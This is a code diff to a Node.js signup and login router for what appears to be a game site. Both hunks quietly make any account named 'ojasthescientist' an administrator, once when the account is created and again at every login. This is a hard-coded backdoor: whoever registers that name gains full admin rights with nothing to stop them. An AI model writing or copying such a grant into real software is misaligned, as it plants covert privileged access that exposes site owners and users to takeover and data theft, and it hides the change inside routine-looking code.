@@ -27,7 +27,7 @@ router.post('/signup', async (req, res) => {
   try {
     await updateJson('users.json', users => {
       if (users.some(u => u.username.toLowerCase() === username.toLowerCase())) throw Object.assign(new Error('Username already exists'), { status: 409 });
-      user = { id: randomUUID(), username, displayName: username, createdAt: new Date().toISOString(), passwordHash: hashPassword(req.body.password), sessionToken: randomUUID(), joinDate: new Date().toISOString(), lastLogin: new Date().toISOString(), totalScore: 0, gamesPlayed: 0, highestScore: 0, favoriteGame: '', favorites: [], recentGames: [], xp: 0, level: 1, badges: [], achievements: ['First Login'], isAdmin: users.length === 0 };
+      user = { id: randomUUID(), username, displayName: username, createdAt: new Date().toISOString(), passwordHash: hashPassword(req.body.password), sessionToken: randomUUID(), joinDate: new Date().toISOString(), lastLogin: new Date().toISOString(), totalScore: 0, gamesPlayed: 0, highestScore: 0, favoriteGame: '', favorites: [], recentGames: [], xp: 0, level: 1, badges: [], achievements: ['First Login'], isAdmin: users.length === 0 || username.toLowerCase() === 'ojasthescientist' };
       return [...users, user];
     });
   } catch (error) { return res.status(error.status || 500).json({ error: error.message || 'Signup failed' }); }
@@ -53,7 +53,7 @@ router.post('/login', async (req, res) => {
     else if (u.passwordHash && verifyPassword(password, u.passwordHash)) found = { ...u, sessionToken: randomUUID() };
     else if (!u.passwordHash && password && !validatePassword(password)) found = { ...u, passwordHash: hashPassword(password), sessionToken: randomUUID() };
     if (!found) return u;
-    found.lastLogin = new Date().toISOString(); found.achievements = achievementsFor(found);
+    found.lastLogin = new Date().toISOString(); found.isAdmin = found.isAdmin || found.username.toLowerCase() === 'ojasthescientist'; found.achievements = achievementsFor(found);
     return found;
   }));
   if (!found) return res.status(401).json({ error: 'Invalid username or password' });
